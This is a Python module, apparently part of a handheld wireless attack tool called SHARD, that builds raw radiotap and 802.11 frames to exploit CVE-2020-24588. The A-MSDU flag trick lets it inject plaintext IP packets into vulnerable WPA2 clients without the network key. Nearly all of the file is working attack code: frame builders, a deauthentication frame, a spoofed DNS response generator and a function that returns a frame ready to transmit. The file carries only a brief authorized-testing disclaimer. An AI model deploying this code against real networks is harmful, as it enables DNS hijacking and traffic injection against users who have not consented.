#!/usr/bin/env python3
"""802.11/radiotap/IP frame builders for SHARD.

Everything here is pure Python (stdlib only) so it runs on python3-light on
the Pager with no scapy/opkg dependency.

The primary technique is CVE-2020-24588: an A-MSDU aggregation injection.
The "A-MSDU Present" flag lives in the QoS Control field, which is *outside*
the CCMP-encrypted body of a normal data frame. A vulnerable WPA2 client
accepts the plaintext frame as if it came from its AP and processes the
encapsulated IP packet -- without the attacker ever knowing the PSK.

IMPORTANT: authorized testing only. Never point this at networks or clients
you do not own or have explicit written permission to test.
"""

from __future__ import annotations

import random
import re
import struct

# --- radiotap present-bit positions ---------------------------------------
RT_TSFT = 0
RT_FLAGS = 1
RT_RATE = 2
RT_CHANNEL = 3
RT_DBM_ANT_SIGNAL = 5
RT_DBM_ANT_NOISE = 6
RT_ANTENNA = 11
RT_TX_FLAGS = 13
RT_MCS = 17

RT_F_FCS = 0x10          # radiotap FLAGS: hardware should insert FCS
RT_TX_NOACK = 0x0001     # radiotap TX_FLAGS: do not wait for 802.11 ACK


def mac_to_bytes(value):
    """Parse 'aa:bb:cc:dd:ee:ff' (or aabb.ccdd.eeff) into 6 bytes."""
    if isinstance(value, (bytes, bytearray)):
        if len(value) != 6:
            raise ValueError("MAC bytes must be exactly 6 bytes")
        return bytes(value)
    text = str(value).strip().lower()
    text = text.replace("-", ":").replace(".", ":")
    parts = [p for p in text.split(":") if p != ""]
    if len(parts) != 6 or any(len(p) != 2 for p in parts):
        raise ValueError("invalid MAC address: %s" % value)
    return bytes(int(p, 16) for p in parts)


def mac_to_str(value):
    return ":".join("%02x" % b for b in mac_to_bytes(value))


def ip_to_bytes(value):
    parts = str(value).strip().split(".")
    if len(parts) != 4:
        raise ValueError("invalid IPv4 address: %s" % value)
    out = bytearray()
    for p in parts:
        n = int(p, 10)
        if not 0 <= n <= 255:
            raise ValueError("invalid IPv4 address: %s" % value)
        out.append(n)
    return bytes(out)


def ip_to_str(value):
    return ".".join(str(b) for b in value)


def checksum(data):
    """Standard IPv4 one's-complement checksum."""
    if len(data) % 2:
        data = data + b"\x00"
    words = struct.unpack("!%dH" % (len(data) // 2), data)
    total = sum(words)
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


# --- radiotap -------------------------------------------------------------

def build_radiotap(rate=0x02, fcs=True, noack=True, channel=None, power=None):
    """Build a radiotap header suitable for monitor-mode injection.

    ``rate`` is in 500 kb/s units (0x02 = 1 Mbps, the most robust legacy rate).
    ``channel`` is a frequency in MHz; when supplied a Channel field is added.
    ``power`` is a dBm TX power value; when supplied a DBM TX Power field is
    added. Field order and alignment follow the radiotap specification.
    """
    present = (1 << RT_FLAGS) | (1 << RT_RATE) | (1 << RT_TX_FLAGS)
    if channel is not None:
        present |= 1 << RT_CHANNEL
    if power is not None:
        present |= 1 << RT_DBM_ANT_SIGNAL

    fields = bytearray()
    fields += struct.pack("<B", RT_F_FCS if fcs else 0)            # flags
    fields += struct.pack("<B", rate & 0xFF)                        # rate

    if channel is not None:
        while len(fields) % 2:
            fields += b"\x00"                                       # 2-byte align
        fields += struct.pack("<HH", int(channel), 0x0000)          # freq, flags

    if power is not None:
        fields += struct.pack("<b", int(power))                     # dBm ant sig

    while len(fields) % 2:
        fields += b"\x00"                                           # TX flags align
    fields += struct.pack("<H", RT_TX_NOACK if noack else 0)

    length = 8 + len(fields)
    return struct.pack("<BBHI", 0, 0, length, present) + bytes(fields)


# --- 802.11 MAC -----------------------------------------------------------

def frame_control(version=0, ftype=2, subtype=8, to_ds=0, from_ds=0,
                  more_frag=0, retry=0, pwr_mgt=0, more_data=0,
                  protected=0, order=0):
    """Build the 2-byte little-endian 802.11 Frame Control field."""
    fc = (version & 0x3)
    fc |= (ftype & 0x3) << 2
    fc |= (subtype & 0xF) << 4
    fc |= (to_ds & 1) << 8
    fc |= (from_ds & 1) << 9
    fc |= (more_frag & 1) << 10
    fc |= (retry & 1) << 11
    fc |= (pwr_mgt & 1) << 12
    fc |= (more_data & 1) << 13
    fc |= (protected & 1) << 14
    fc |= (order & 1) << 15
    return struct.pack("<H", fc)


def seq_control(fragment=0, sequence=0):
    """Sequence Control: 4-bit fragment number + 12-bit sequence number."""
    return struct.pack("<H", ((sequence & 0xFFF) << 4) | (fragment & 0xF))


def build_qos_data(ra, ta, bssid, payload, tid=0, amsdu=False,
                   from_ds=True, seq=0, protected=False):
    """Build a QoS Data MAC frame.

    With ``from_ds=True`` (the normal direction for AP->client injection):
      Addr1 = RA = client MAC
      Addr2 = TA = AP BSSID
      Addr3 = SA = AP BSSID
    """
    fc = frame_control(ftype=2, subtype=8, from_ds=1 if from_ds else 0,
                       to_ds=0 if from_ds else 1, protected=1 if protected else 0)
    qos = struct.pack("<H", (tid & 0x0F) | (0x80 if amsdu else 0))
    return (fc + struct.pack("<H", 0) +                     # Frame Control + Duration
            mac_to_bytes(ra) + mac_to_bytes(ta) + mac_to_bytes(bssid) +
            seq_control(sequence=seq) + qos + payload)


def build_deauth(bssid, target, reason=2, seq=0):
    """Build a plain deauthentication management frame (for capability tests)."""
    fc = frame_control(ftype=0, subtype=12)
    return (fc + struct.pack("<H", 0) + mac_to_bytes(target) +
            mac_to_bytes(bssid) + mac_to_bytes(bssid) +
            seq_control(sequence=seq) + struct.pack("<H", reason))


# --- A-MSDU / 802.3 -------------------------------------------------------

LLC_SNAP_IPV4 = bytes.fromhex("aaaa030000000800")


def build_amsdu_payload(client_mac, sa_mac, ip_packet):
    """Wrap an IP packet in an 802.3 frame suitable for an A-MSDU.

    The A-MSDU subframe is: DA(6) | SA(6) | Length(2, big-endian) | payload,
    padded to a 4-byte boundary. The payload begins with LLC/SNAP for IPv4.
    """
    body = LLC_SNAP_IPV4 + ip_packet
    subframe = (mac_to_bytes(client_mac) + mac_to_bytes(sa_mac) +
                struct.pack(">H", len(body)) + body)
    while len(subframe) % 4:
        subframe += b"\x00"
    return subframe


# --- IPv4 / ICMP ----------------------------------------------------------

def build_icmp_echo(src_ip, dst_ip, ident=None, seq=1, payload=b"SHARD"):
    """Build a complete IPv4 ICMP Echo Request packet."""
    ident = random.randint(0, 0xFFFF) if ident is None else ident
    pseudo = struct.pack("!BBHHH", 8, 0, 0, ident, seq) + payload
    icmp = struct.pack("!BBHHH", 8, 0, checksum(pseudo), ident, seq) + payload
    return _build_ipv4(1, src_ip, dst_ip, icmp)


def build_udp(src_ip, dst_ip, src_port, dst_port, payload=b""):
    """Build an IPv4 UDP packet."""
    length = 8 + len(payload)
    udp = struct.pack("!HHHH", src_port, dst_port, length, 0) + payload
    return _build_ipv4(17, src_ip, dst_ip, udp)


def build_dns_response_response(src_ip, dst_ip, query_name, answer_ip,
                                transaction_id=None, src_port=53,
                                dst_port=53):
    """Build a minimal DNS response mapping ``query_name`` to ``answer_ip``.

    This is deliberately simple: one question, one answer, no authority or
    additional records. Enough to demonstrate injected DNS into a WPA2 client.
    """
    transaction_id = random.randint(0, 0xFFFF) if transaction_id is None else transaction_id
    qname = b"".join(bytes([len(p)]) + p.encode("ascii")
                     for p in query_name.strip(".").split(".")) + b"\x00"
    question = qname + struct.pack("!HH", 1, 1)          # A, IN
    answer = struct.pack("!HHHHIH", 0xC00C, 1, 1, 60, 4, 0) + ip_to_bytes(answer_ip)
    dns = (struct.pack("!HHHHHH", transaction_id, 0x8180, 1, 1, 0, 0) +
           question + answer)
    return build_udp(src_ip, dst_ip, src_port, dst_port, dns)


def _build_ipv4(protocol, src_ip, dst_ip, payload):
    total_len = 20 + len(payload)
    header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, total_len,
        random.randint(0, 0xFFFF), 0,
        64, protocol, 0,
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip),
    )
    header = header[:10] + struct.pack("!H", checksum(header)) + header[12:]
    return header + payload


# --- top-level injection frame -------------------------------------------

def build_amsdu_injection(client_mac, ap_bssid, ip_packet, channel=None,
                          rate=0x02, seq=0, power=None):
    """Return a complete radiotap + 802.11 QoS A-MSDU frame ready to send."""
    amsdu = build_amsdu_payload(client_mac, ap_bssid, ip_packet)
    dot11 = build_qos_data(client_mac, ap_bssid, ap_bssid, amsdu,
                           amsdu=True, from_ds=True, seq=seq)
    radio = build_radiotap(rate=rate, channel=channel, power=power)
    return radio + dot11
